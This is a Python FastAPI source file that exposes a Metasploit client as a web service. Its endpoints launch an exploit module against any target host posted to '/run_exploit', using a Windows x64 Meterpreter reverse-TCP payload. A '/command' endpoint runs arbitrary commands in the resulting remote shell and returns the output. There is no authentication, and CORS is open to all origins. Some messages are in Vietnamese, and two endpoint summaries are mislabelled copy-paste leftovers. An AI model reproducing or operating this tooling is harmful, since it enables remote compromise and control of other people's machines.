from typing import Union
from fastapi import FastAPI, APIRouter, Request
from core.config import settings
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import asyncio
from meta.meta import client, exploit

app = FastAPI(title=settings.PROJECT_NAME)

router = APIRouter()


origins = [
    "*"
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class Exploit(BaseModel):
    rhosts: str

class RemoteCode(BaseModel):
    message: str
    
@router.get('/functions', summary="Get all asins belong to user")
def list_function():
    return [m for m in dir(client) if not m.startswith('_')]

@router.get('/module_information', summary="Get all asins belong to user")
def list_module_exploit():
    return {"data" :exploit.options, "description": exploit.description, "required": exploit.required, "run_options": exploit.runoptions}

@router.post('/run_exploit', summary="Thay doi option")
async def run_module_exploit(exploit_option: Exploit):
    rhosts = exploit_option.rhosts
    exploit['RHOSTS'] = rhosts
    result = exploit.execute(payload='windows/x64/meterpreter/reverse_tcp')
    if len(client.sessions.list) > 0:
        return {"message": "Tao shell thanh cong", "data":result}

@router.post('/command', summary="send command")
async def create_control_command(command: RemoteCode):
    if command.message and client.sessions.list:
        command = command.message
        shell = client.sessions.session(list(client.sessions.list.keys())[0])
        if command and shell:
            result = shell.run_with_output(command)
            if result:
                lines_result = result.splitlines()
                return {"result": lines_result, "command": command}
        return "Thuc hien cau lenh that bai"
        
@router.post('/delete', summary="Stop shell")
def stop_shell_session():
    if client.sessions.list:
        shell = client.sessions.session(list(client.sessions.list.keys())[0])
        shell.stop()
        return {"message": "Dung shell thanh cong"}

# @router.post('/create_exploit', summary="Chon module exploit")
# def create_exploit(exploit: Exploit):
    
#     return exploit


app.include_router(router, prefix=settings.API_V1_STR)

@app.get("/")
def hello():
    return {"Hello": "World"}

